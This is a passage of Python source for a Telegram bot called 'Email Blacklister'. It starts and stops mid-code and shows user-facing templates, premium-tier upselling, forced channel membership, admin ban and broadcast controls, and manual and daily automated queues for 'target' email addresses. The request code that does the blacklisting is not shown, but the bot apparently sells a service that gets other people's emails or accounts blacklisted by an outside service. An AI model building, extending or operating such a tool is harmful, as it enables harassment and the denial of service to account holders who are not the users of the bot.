━━━━━━━━━━━━━━━━━━━━━━━━
Activity Metrics
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Total Operations: {total_blacklists}
▸ Automated Queue: {total_auto}
▸ Manual Limits: {FREE_MANUAL_LIMIT} free / {PREMIUM_MANUAL_LIMIT} premium
▸ Auto Limits: {FREE_AUTO_LIMIT} free / {PREMIUM_AUTO_LIMIT} premium

━━━━━━━━━━━━━━━━━━━━━━━━
Performance Metrics
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Speed: ⚡⚡⚡⚡⚡ Optimized
▸ Accuracy: 💯 Verified
▸ Privacy: ✅ Guaranteed
▸ Reliability: 🏆 Enterprise-Grade

━━━━━━━━━━━━━━━━━━━━━━━━
Scheduled Operations
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Automated Run: 4:10 AM Daily
▸ Manual Access: 24/7 Available

━━━━━━━━━━━━━━━━━━━━━━━━
👑 Owner: {OWNER_USERNAME}
💬 Support: 24/7 Available
━━━━━━━━━━━━━━━━━━━━━━━━"""

def build_profile_text(user, user_id):
    name = user.full_name if user.full_name else 'Unknown'
    username = f"@{user.username}" if user.username else "Not Set"
    u = find_user_by_id(user_id)
    joined = u.get('joined', 'Unknown') if u else 'Unknown'

    if is_admin(user_id):
        status = "👑 Administrator"
    elif is_premium(user_id):
        status = "💎 Premium Member"
    else:
        status = "🆓 Standard Member"

    count = get_user_blacklist_count(user_id)
    manual_limit = get_manual_limit(user_id)
    auto_emails = get_user_auto_emails(user_id)
    auto_count = len(auto_emails)
    auto_limit = get_auto_limit(user_id)

    manual_remaining = "♾️" if manual_limit == float('inf') else str(manual_limit - count)
    auto_remaining = "♾️" if auto_limit == float('inf') else str(auto_limit - auto_count)

    text = f"""👤 Account Profile

━━━━━━━━━━━━━━━━━━━━━━━━
Identity
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Name: <a href="tg://user?id={user_id}">{name}</a>
▸ User ID: <code>{user_id}</code>
▸ Username: {username}
▸ Status: {status}
▸ Registered: {joined}

━━━━━━━━━━━━━━━━━━━━━━━━
Usage Statistics
━━━━━━━━━━━━━━━━━━━━━━━━
Manual Blacklist
  ▸ Used: {count} / {format_limit(manual_limit)}
  ▸ Available: {manual_remaining}

Automated Queue
  ▸ Slots Used: {auto_count} / {format_limit(auto_limit)}
  ▸ Available: {auto_remaining}

━━━━━━━━━━━━━━━━━━━━━━━━
Important Notes
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Failed attempts do not consume quota
▸ Automated successes are separate
▸ Premium unlocks higher limits

━━━━━━━━━━━━━━━━━━━━━━━━
👑 {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""

    return text

def build_buy_premium_text(user_id):
    if is_admin(user_id):
        return f"""💎 Premium Access

━━━━━━━━━━━━━━━━━━━━━━━━
👑 Administrator Detected
━━━━━━━━━━━━━━━━━━━━━━━━
Your account already carries the highest 
level of access available.

━━━━━━━━━━━━━━━━━━━━━━━━
Current Privileges
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Unlimited manual blacklists
▸ Unlimited automated slots
▸ Priority processing queue
▸ Full premium feature set
▸ Administrative authority

No purchase is necessary — enjoy your 
elevated access.

━━━━━━━━━━━━━━━━━━━━━━━━
👑 {OWNER_USERNAME}"""

    if is_premium(user_id):
        return f"""💎 Premium Access

━━━━━━━━━━━━━━━━━━━━━━━━
✨ Premium Member Confirmed
━━━━━━━━━━━━━━━━━━━━━━━━
You are already enjoying the benefits 
of our premium tier.

━━━━━━━━━━━━━━━━━━━━━━━━
Active Benefits
━━━━━━━━━━━━━━━━━━━━━━━━
▸ {PREMIUM_MANUAL_LIMIT} manual blacklists
▸ {PREMIUM_AUTO_LIMIT} automated slots
▸ Priority processing queue
▸ Premium profile badge
▸ Exclusive feature access

Thank you for your continued support.

━━━━━━━━━━━━━━━━━━━━━━━━
Questions? {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""

    return f"""💎 Premium Subscription

━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Unlock Full Potential
━━━━━━━━━━━━━━━━━━━━━━━━
Upgrade your account and remove all 
limitations from your experience.

━━━━━━━━━━━━━━━━━━━━━━━━
Premium Advantages
━━━━━━━━━━━━━━━━━━━━━━━━
▸ {PREMIUM_MANUAL_LIMIT} manual blacklists (vs {FREE_MANUAL_LIMIT})
▸ {PREMIUM_AUTO_LIMIT} automated slots (vs {FREE_AUTO_LIMIT})
▸ Priority server queue
▸ Premium profile badge
▸ Priority customer support
▸ Early access to new features

━━━━━━━━━━━━━━━━━━━━━━━━
Investment
━━━━━━━━━━━━━━━━━━━━━━━━
Multiple plans are available to suit 
your needs and budget. Contact us for 
current pricing information.

━━━━━━━━━━━━━━━━━━━━━━━━
How To Subscribe
━━━━━━━━━━━━━━━━━━━━━━━━
Message our owner directly:

👑 @spideyabd

Simply mention "PREMIUM" and you'll be 
guided through a quick activation.

━━━━━━━━━━━━━━━━━━━━━━━━
Why Upgrade?
━━━━━━━━━━━━━━━━━━━━━━━━
▸ 7x higher manual quota
▸ 5x more automated slots
▸ Faster processing priority
▸ Enhanced user experience
▸ Exclusive features
▸ Priority support

━━━━━━━━━━━━━━━━━━━━━━━━
🛡️ Safe & Secure
💯 Satisfaction Guaranteed
⚡ Instant Activation

Upgrade today and unlock your full 
potential.

👑 DM {OWNER_USERNAME}"""

def format_result(result, email, user, user_id):
    now_time = datetime.now().strftime('%I:%M %p')
    now_date = datetime.now().strftime('%d-%m-%Y')
    name = user.full_name if user.full_name else 'User'
    is_adm = is_admin(user_id)
    count = get_user_blacklist_count(user_id)
    manual_limit = get_manual_limit(user_id)
    remaining = "♾️" if manual_limit == float('inf') else str(manual_limit - count)

    if result == "success":
        body = f"""✅ Operation Successful

━━━━━━━━━━━━━━━━━━━━━━━━
Execution Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Email: {email}
▸ Status: Blacklisted
▸ Operator: {name}
▸ Timestamp: {now_time} | {now_date}

━━━━━━━━━━━━━━━━━━━━━━━━
Operation Summary
━━━━━━━━━━━━━━━━━━━━━━━━
The target email has been successfully 
added to our comprehensive blacklist.

This address will no longer receive 
communications from the protected 
services.

"""
        if is_adm:
            body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
Administrative Access
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Unlimited authority active
▸ Zero quota consumption
▸ Full system privileges

"""
        else:
            body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
Updated Account Status
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Quota Used: {count} / {format_limit(manual_limit)}
▸ Available: {remaining}

"""
        body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
👑 Support: {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""
        return body

    elif result == "already_blacklisted":
        body = f"""🔴 Already Blacklisted

━━━━━━━━━━━━━━━━━━━━━━━━
Execution Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Email: {email}
▸ Status: Pre-existing Blacklist
▸ Operator: {name}
▸ Timestamp: {now_time} | {now_date}

━━━━━━━━━━━━━━━━━━━━━━━━
Operation Summary
━━━━━━━━━━━━━━━━━━━━━━━━
This email address is already present 
in our blacklist database.

Possible reasons:
▸ Previously submitted manually
▸ Added via automated queue
▸ Permanently restricted

"""
        if not is_adm:
            body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
Account Impact
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Quota Used: {count} / {format_limit(manual_limit)}
▸ Available: {remaining}

▸ No quota was consumed for this attempt.

"""
        body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
👑 Support: {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""
        return body

    elif result == "no_binding":
        body = f"""⚠️ No Binding Found

━━━━━━━━━━━━━━━━━━━━━━━━
Execution Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Email: {email}
▸ Status: Not Bound To Account
▸ Operator: {name}
▸ Timestamp: {now_time} | {now_date}

━━━━━━━━━━━━━━━━━━━━━━━━
Operation Summary
━━━━━━━━━━━━━━━━━━━━━━━━
The submitted email address is not 
linked to any account in our systems.

Implications:
▸ Email does not exist in our database
▸ No account is associated with it
▸ There is no record to blacklist

"""
        if not is_adm:
            body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
Account Impact
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Quota Used: {count} / {format_limit(manual_limit)}
▸ Available: {remaining}

▸ No quota was consumed for this attempt.

"""
        body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
Recommended Actions
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Verify spelling accuracy
▸ Confirm account registration
▸ Try a different email address

━━━━━━━━━━━━━━━━━━━━━━━━
👑 Support: {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""
        return body

    elif result == "wrong_email":
        body = f"""❌ Invalid Email Format

━━━━━━━━━━━━━━━━━━━━━━━━
Execution Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Email: {email}
▸ Status: Format Rejected
▸ Operator: {name}
▸ Timestamp: {now_time} | {now_date}

━━━━━━━━━━━━━━━━━━━━━━━━
Operation Summary
━━━━━━━━━━━━━━━━━━━━━━━━
The submitted address does not meet 
our format requirements.

Required Format:
▸ Must contain @ symbol
▸ Must contain . extension
▸ No whitespace allowed
▸ Valid domain required

Example: user@example.com

"""
        if not is_adm:
            body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
Account Impact
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Quota Used: {count} / {format_limit(manual_limit)}
▸ Available: {remaining}

▸ No quota was consumed for this attempt.

"""
        body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
Recommended Actions
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Review the email spelling
▸ Ensure @ and . are present
▸ Submit corrected format

━━━━━━━━━━━━━━━━━━━━━━━━
👑 Support: {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""
        return body

    else:
        body = f"""📡 Network Error

━━━━━━━━━━━━━━━━━━━━━━━━
Execution Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Email: {email}
▸ Status: Connection Failed
▸ Operator: {name}
▸ Timestamp: {now_time} | {now_date}

━━━━━━━━━━━━━━━━━━━━━━━━
Operation Summary
━━━━━━━━━━━━━━━━━━━━━━━━
Unable to establish communication with 
the processing server.

Possible causes:
▸ Server maintenance window
▸ Temporary network issue
▸ Service unavailability
▸ Connection timeout

"""
        if not is_adm:
            body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
Account Impact
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Quota Used: {count} / {format_limit(manual_limit)}
▸ Available: {remaining}

▸ No quota was consumed for this attempt.

"""
        body += f"""━━━━━━━━━━━━━━━━━━━━━━━━
Recommended Actions
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Wait a moment and retry
▸ Verify your connection
▸ Contact support if persistent

━━━━━━━━━━━━━━━━━━━━━━━━
👑 Support: {OWNER_USERNAME}
━━━━━━━━━━━━━━━━━━━━━━━━"""
        return body

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        if user is None:
            await update.message.reply_text("❌ Unable to identify user.")
            return
        user_id = user.id
        if is_user_banned(user_id):
            await update.message.reply_text(
                f"🚫 Access Revoked\n\nYour access to this service has been restricted.\n\nContact: {OWNER_USERNAME}"
            )
            return
        user_states[user_id] = "idle"
        is_new = is_new_user(user_id)
        add_user(user_id, user.username, user.full_name)
        is_member = await check_channel_membership(context, user_id)
        if user_id != OWNER_ID and not is_member:
            await send_force_channel_message(update, context)
            return
        if is_new:
            await notify_owner_new_user(context, user)

        if is_admin(user_id):
            welcome_text = f"""✦ Email Blacklister ✦
━━━━━━━━━━━━━━━━━━━━━━━━

Welcome back, {user.full_name if user.full_name else 'Administrator'}.

━━━━━━━━━━━━━━━━━━━━━━━━
👑 Administrative Access
━━━━━━━━━━━━━━━━━━━━━━━━
Your account carries the highest level 
of authority across this platform.

▸ Unlimited manual operations
▸ Unlimited automated slots
▸ Full premium management
▸ Broadcast authority
▸ User management access
▸ Complete analytics

━━━━━━━━━━━━━━━━━━━━━━━━
System Information
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Automated Run: 4:10 AM Daily
▸ Engine Workers: {NUM_WORKERS} Active
▸ Platform: Fully Operational

━━━━━━━━━━━━━━━━━━━━━━━━
👑 {OWNER_USERNAME}
💬 Support: 24/7 Available
━━━━━━━━━━━━━━━━━━━━━━━━

Select an operation from the menu."""
        else:
            count = get_user_blacklist_count(user_id)
            manual_limit = get_manual_limit(user_id)
            remaining = "♾️" if manual_limit == float('inf') else str(manual_limit - count)
            premium_status = "💎 Premium Member" if is_premium(user_id) else "🆓 Standard Member"
            welcome_text = f"""✦ Email Blacklister ✦
━━━━━━━━━━━━━━━━━━━━━━━━

Greetings, {user.full_name if user.full_name else 'Member'}.

Your account has been verified and the 
premium-grade engine is now at your 
complete disposal.

━━━━━━━━━━━━━━━━━━━━━━━━
Account Overview
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Status: {premium_status}
▸ Manual Quota: {count} / {format_limit(manual_limit)}
▸ Available: {remaining}

━━━━━━━━━━━━━━━━━━━━━━━━
Available Operations
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Instant Email Blacklisting
▸ Automated Daily Processing
▸ Personal Analytics
▸ Premium Tier Upgrades

━━━━━━━━━━━━━━━━━━━━━━━━
👑 {OWNER_USERNAME}
💬 Support: 24/7 Available
━━━━━━━━━━━━━━━━━━━━━━━━

Select an operation from the menu."""

        await update.message.reply_text(welcome_text, reply_markup=get_user_keyboard(user_id))

        if is_admin(user_id):
            await update.message.reply_text(
                """👑 Administrative Control Panel

━━━━━━━━━━━━━━━━━━━━━━━━
All administrative tools are available 
through the interface below.

Select an operation to proceed.""",
                reply_markup=get_admin_inline_keyboard()
            )
    except Exception as e:
        print(f"{R}[!] Error in start: {e}{S}")
        await update.message.reply_text("❌ An unexpected error occurred. Please try again.")

async def handle_keyboard_button(update: Update, context: ContextTypes.DEFAULT_TYPE, user, text):
    user_id = user.id
    if text == USER_KB_BLACKLIST:
        user_states[user_id] = "awaiting_email"
        await update.message.reply_text(
            """📧 Blacklist Operation — Email Required

━━━━━━━━━━━━━━━━━━━━━━━━
Please submit the target email address 
you wish to blacklist.

Format: user@example.com

▸ Click any other button to cancel."""
        )
    elif text == USER_KB_ADD_AUTO:
        auto_limit = get_auto_limit(user_id)
        auto_emails = get_user_auto_emails(user_id)
        if len(auto_emails) >= auto_limit:
            await update.message.reply_text(
                f"""❌ Automated Queue Full

━━━━━━━━━━━━━━━━━━━━━━━━
Your automated queue has reached the 
maximum capacity.

▸ Current Usage: {len(auto_emails)} / {format_limit(auto_limit)}

💎 Upgrade to Premium for 
{PREMIUM_AUTO_LIMIT} slots.

👑 Contact: {OWNER_USERNAME}"""
            )
            return
        user_states[user_id] = "awaiting_user_auto_email"
        await update.message.reply_text(
            f"""➕ Add Automated Email

━━━━━━━━━━━━━━━━━━━━━━━━
Please submit the email address(es) 
to be added to your automated queue.

Format:
▸ Single: user@example.com
▸ Multiple: email1@x.com, email2@x.com

▸ Queue Capacity: {len(auto_emails)} / {format_limit(auto_limit)}
▸ Processing Schedule: Daily at 4:10 AM

▸ Click any other button to cancel."""
        )
    elif text == USER_KB_VIEW_AUTO:
        user_states[user_id] = "idle"
        auto_emails = get_user_auto_emails(user_id)
        auto_limit = get_auto_limit(user_id)
        if auto_emails:
            email_list = "\n".join([f"▸ {e}" for e in auto_emails])
            await update.message.reply_text(
                f"""📁 Your Automated Queue

━━━━━━━━━━━━━━━━━━━━━━━━
Queue Contents
━━━━━━━━━━━━━━━━━━━━━━━━
{email_list}

━━━━━━━━━━━━━━━━━━━━━━━━
▸ Capacity: {len(auto_emails)} / {format_limit(auto_limit)}
▸ Schedule: Daily at 4:10 AM
━━━━━━━━━━━━━━━━━━━━━━━━"""
            )
        else:
            await update.message.reply_text(
                f"""📁 Your Automated Queue

━━━━━━━━━━━━━━━━━━━━━━━━
Status: Empty

Your automated queue is currently 
empty.

▸ Capacity: 0 / {format_limit(auto_limit)}

Use "➕ Add Auto Email" to begin 
building your queue."""
            )
    elif text == USER_KB_REMOVE_AUTO:
        auto_emails = get_user_auto_emails(user_id)
        if not auto_emails:
            await update.message.reply_text(
                """❌ No Emails To Remove

━━━━━━━━━━━━━━━━━━━━━━━━
Your automated queue is currently 
empty. There is nothing to remove."""
            )
            return
        user_states[user_id] = "awaiting_user_remove_email"
        await update.message.reply_text(
            """❌ Remove Automated Email

━━━━━━━━━━━━━━━━━━━━━━━━
Please submit the email address(es) 
to be removed from your queue.

Format:
▸ Single: user@example.com
▸ Multiple: email1@x.com, email2@x.com

▸ Click any other button to cancel."""
        )
    elif text == USER_KB_CLEAR_AUTO:
        auto_emails = get_user_auto_emails(user_id)
        if not auto_emails:
            await update.message.reply_text(
                """❌ No Emails To Clear

━━━━━━━━━━━━━━━━━━━━━━━━
Your automated queue is already empty."""
            )
            return
        keyboard = [
            [InlineKeyboardButton("✅ Confirm Clear", callback_data='user_confirm_clear')],
            [InlineKeyboardButton("❌ Cancel", callback_data='user_cancel_clear')]
        ]
        await update.message.reply_text(
            f"""🗑️ Clear Automated Queue

━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ Confirmation Required

This operation will permanently remove 
all {len(auto_emails)} email(s) from your 
automated queue.

This action cannot be undone.

Confirm your decision below.""",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif text == USER_KB_PROFILE:
        user_states[user_id] = "idle"
        await update.message.reply_text(
            build_profile_text(user, user_id),
            parse_mode='HTML'
        )
    elif text == USER_KB_PREMIUM:
        user_states[user_id] = "idle"
        await update.message.reply_text(build_buy_premium_text(user_id))
    elif text == USER_KB_HELP:
        user_states[user_id] = "idle"
        await update.message.reply_text(build_help_text())
    elif text == USER_KB_OWNER:
        user_states[user_id] = "idle"
        await update.message.reply_text(build_owner_text())
    elif text == USER_KB_STATUS:
        user_states[user_id] = "idle"
        await update.message.reply_text(build_status_text())

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user = update.effective_user
        if user is None:
            await query.edit_message_text("❌ Unable to identify user.")
            return
        user_id = user.id
        if is_user_banned(user_id):
            await query.edit_message_text("🚫 Access Revoked\n\nYour access to this service has been restricted.")
            return
        data = query.data
        if user_id != OWNER_ID:
            is_member = await check_channel_membership(context, user_id)
            if not is_member:
                await send_force_channel_message_update(query)
                return

        if data == 'blacklist':
            manual_limit = get_manual_limit(user_id)
            count = get_user_blacklist_count(user_id)
            if count >= manual_limit and manual_limit != float('inf'):
                await query.edit_message_text(
                    f"""❌ Manual Quota Reached

━━━━━━━━━━━━━━━━━━━━━━━━
You have consumed your complete manual 
blacklist quota.

▸ Used: {count} / {format_limit(manual_limit)}

💎 Premium upgrades to {PREMIUM_MANUAL_LIMIT} 
manual operations.

👑 Contact: {OWNER_USERNAME}"""
                )
                return
            user_states[user_id] = "awaiting_email"
            if is_admin(user_id):
                reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
                await query.edit_message_text(
                    """📧 Blacklist Operation — Email Required

Please submit the target email address 
you wish to blacklist.

Format: user@example.com""",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    """📧 Blacklist Operation — Email Required

Please submit the target email address 
you wish to blacklist.

Format: user@example.com

▸ Use the keyboard below to cancel."""
                )

        elif data == 'add_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            user_states[user_id] = "awaiting_auto_email"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
            await query.edit_message_text(
                """📧 Add Global Automated Email

━━━━━━━━━━━━━━━━━━━━━━━━
Please submit the email address(es) 
to be added to the global automated 
queue.

Format:
▸ Single: user@example.com
▸ Multiple: email1@x.com, email2@x.com

▸ Schedule: Daily at 4:10 AM""",
                reply_markup=reply_markup
            )

        elif data == 'remove_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            user_states[user_id] = "awaiting_remove_email"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
            await query.edit_message_text(
                """❌ Remove From Global Automated Queue

━━━━━━━━━━━━━━━━━━━━━━━━
Please submit the email address(es) 
to be removed from the global queue.

Format:
▸ Single: user@example.com
▸ Multiple: email1@x.com, email2@x.com""",
                reply_markup=reply_markup
            )

        elif data == 'view_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            if auto_emails_list:
                email_list = "\n".join([f"▸ {email}" for email in auto_emails_list])
                text = f"""📁 Global Automated Queue

━━━━━━━━━━━━━━━━━━━━━━━━
Queue Contents
━━━━━━━━━━━━━━━━━━━━━━━━
{email_list}

━━━━━━━━━━━━━━━━━━━━━━━━
▸ Total: {len(auto_emails_list)} email(s)
▸ Schedule: Daily at 4:10 AM
━━━━━━━━━━━━━━━━━━━━━━━━"""
            else:
                text = """📁 Global Automated Queue

━━━━━━━━━━━━━━━━━━━━━━━━
Status: Empty

No emails are present in the global 
automated queue.

Use "Add Global Auto Email" to begin."""
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Return", callback_data='back')]]))

        elif data == 'clear_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            auto_emails_list.clear()
            save_auto_emails()
            await query.edit_message_text(
                """🗑️ Global Automated Queue Cleared

All emails have been removed from the 
global automated queue.""",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Return", callback_data='back')]])
            )

        elif data == 'give_premium':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            user_states[user_id] = "awaiting_premium_user"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
            await query.edit_message_text(
                """💎 Grant Premium Access

━━━━━━━━━━━━━━━━━━━━━━━━
Please submit the user ID to grant 
premium access.

Example: 123456789

▸ Alternatively, use command:
/premium <user_id>""",
                reply_markup=reply_markup
            )

        elif data == 'remove_premium':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            user_states[user_id] = "awaiting_remove_premium_user"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='cancel')]])
            await query.edit_message_text(
                """⬇️ Revoke Premium Access

━━━━━━━━━━━━━━━━━━━━━━━━
Please submit the user ID to revoke 
premium access.

Example: 123456789

▸ Alternatively, use command:
/removepremium <user_id>""",
                reply_markup=reply_markup
            )

        elif data == 'premium_list':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            premiums = [u for u in users_list if u.get('is_premium', False)]
            if not premiums:
                await query.edit_message_text(
                    """📋 Premium Users Registry

━━━━━━━━━━━━━━━━━━━━━━━━
Status: Empty

No premium users exist yet.

Use "Grant Premium Access" to add 
the first premium member."""
                )
                return
            text = "📋 Premium Users Registry\n\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
            for p in premiums:
                text += f"\n💎 {p['name']}\n   @{p['username']}\n   ID: {p['id']}\n"
            text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━\n▸ Total: {len(premiums)} premium user(s)"
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Return", callback_data='back')]]))

        elif data == 'broadcast':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            await query.edit_message_text(
                f"""📢 Broadcast System

━━━━━━━━━━━━━━━━━━━━━━━━
Transmit a message to all registered 
users of this platform.

▸ Total Audience: {len(users_list)}

Usage: /broadcast <message>

Example:
/broadcast Important announcement 
for all users!"""
            )

        elif data == 'users':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            if not users_list:
                await query.edit_message_text("📊 User Registry\n\nNo users registered yet.")
                return
            user_text = "\n".join([f"▸ {u['name']} (@{u['username']})\n  ID: {u['id']} | Used: {u.get('blacklist_count', 0)} | {'💎' if u.get('is_premium') else '🆓'}" for u in users_list[-10:]])
            await query.edit_message_text(
                f"""📊 User Registry

━━━━━━━━━━━━━━━━━━━━━━━━
Recent Members
━━━━━━━━━━━━━━━━━━━━━━━━
{user_text}

━━━━━━━━━━━━━━━━━━━━━━━━
▸ Total Registered: {len(users_list)}
▸ 💎 Premium | 🆓 Standard
━━━━━━━━━━━━━━━━━━━━━━━━"""
            )

        elif data == 'ban':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            await query.edit_message_text(
                """🚫 Restrict User Access

━━━━━━━━━━━━━━━━━━━━━━━━
Revoke a user's access to the platform.

Usage: /ban <user_id>

Example: /ban 123456789"""
            )

        elif data == 'unban':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            await query.edit_message_text(
                """✅ Restore User Access

━━━━━━━━━━━━━━━━━━━━━━━━
Restore a restricted user's access.

Usage: /unban <user_id>

Example: /unban 123456789"""
            )

        elif data == 'bannedlist':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Access Denied\n\nThis feature is restricted to administrators.")
                return
            if not banned_users_list:
                await query.edit_message_text(
                    """📋 Restricted Users Registry

━━━━━━━━━━━━━━━━━━━━━━━━
Status: Empty

No users are currently restricted."""
                )
                return
            banned_text = "\n".join([f"▸ {uid}" for uid in banned_users_list])
            await query.edit_message_text(
                f"""📋 Restricted Users Registry

━━━━━━━━━━━━━━━━━━━━━━━━
{banned_text}
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Total Restricted: {len(banned_users_list)} user(s)"""
            )

        elif data == 'check_join':
            is_member = await check_channel_membership(context, user_id)
            if is_member:
                await query.edit_message_text("✅ Verification Successful\n\nYour membership has been confirmed. Welcome aboard!")
                await query.message.reply_text(
                    "🎯 Main Menu\n\nSelect an operation from below:",
                    reply_markup=get_user_keyboard(user_id)
                )
                if is_admin(user_id):
                    await query.message.reply_text("👑 Administrative Control Panel", reply_markup=get_admin_inline_keyboard())
            else:
                keyboard = [
                    [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK)],
                    [InlineKeyboardButton("✅ I Have Joined", callback_data='check_join')]
                ]
                await query.edit_message_text(
                    """❌ Verification Failed

━━━━━━━━━━━━━━━━━━━━━━━━
You have not yet joined our channel.

▸ Channel: @SPIDEYFREEFILES

Please join to continue.""",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )

        elif data == 'user_confirm_clear':
            clear_user_auto_emails(user_id)
            await query.edit_message_text(
                """🗑️ Automated Queue Cleared

All emails have been permanently 
removed from your automated queue."""
            )

        elif data == 'user_cancel_clear':
            await query.edit_message_text(
                """❌ Operation Cancelled

Your automated queue remains unchanged."""
            )

        elif data == 'cancel':
            user_states[user_id] = "idle"
            if is_admin(user_id):
                await query.edit_message_text("✅ Operation Cancelled\n\nAdministrative panel remains available.", reply_markup=get_admin_inline_keyboard())
            else:
                await query.edit_message_text("✅ Operation Cancelled\n\nUse the keyboard below to continue.")

        elif data == 'back':
            user_states[user_id] = "idle"
            if is_admin(user_id):
                await query.edit_message_text("👑 Administrative Control Panel\n\nSelect an operation:", reply_markup=get_admin_inline_keyboard())
            else:
                await query.edit_message_text("🎯 Main Menu\n\nUse the keyboard below to continue:")

        elif data == 'broadcast_yes' or data == 'broadcast_no':
            await broadcast_callback(update, context)

    except Exception as e:
        print(f"{R}[!] Error in button_callback: {e}{S}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        if user is None:
            return
        if not update.message or not update.message.text:
            return
        user_id = user.id
        if is_user_banned(user_id):
            await update.message.reply_text("🚫 Access Revoked\n\nYour access to this service has been restricted.")
            return
        message_text = update.message.text.strip()
        if not message_text:
            return
        if user_id != OWNER_ID:
            is_member = await check_channel_membership(context, user_id)
            if not is_member:
                await send_force_channel_message(update, context)
                return

        if message_text in USER_KEYBOARD_TEXTS:
            user_states[user_id] = "idle"
            await handle_keyboard_button(update, context, user, message_text)
            return

        if is_admin(user_id) and user_states.get(user_id) == "awaiting_remove_email":
            emails = [e.strip() for e in message_text.split(',')]
            removed_emails = []
            not_found_emails = []
            for email in emails:
                if email in auto_emails_list:
                    auto_emails_list.remove(email)
                    removed_emails.append(email)
                else:
                    not_found_emails.append(email)
            save_auto_emails()
            response = f"""❌ Global Queue Update

━━━━━━━━━━━━━━━━━━━━━━━━
Removal Report
━━━━━━━━━━━━━━━━━━━━━━━━
▸ Removed: {len(removed_emails)}
▸ Not Found: {len(not_found_emails)}
▸ Remaining: {len(auto_emails_list)}
━━━━━━━━━━━━━━━━━━━━━━━━"""
            if removed_emails:
                response += "\n\n✅ Removed:\n" + "\n".join([f"▸ {e}" for e in removed_emails])
            if not_found_emails:
                response += "\n\n❌ Not Found:\n" + "\n".join([f"▸ {e}" for e in not_found_emails])
            user_states[user_id] = "idle"
            await update.message.reply_text(response, reply_markup=get_admin_inline_keyboard())
            return

        if is_admin(user_id) and user_states.get(user_id) == "awaiting_auto_email":
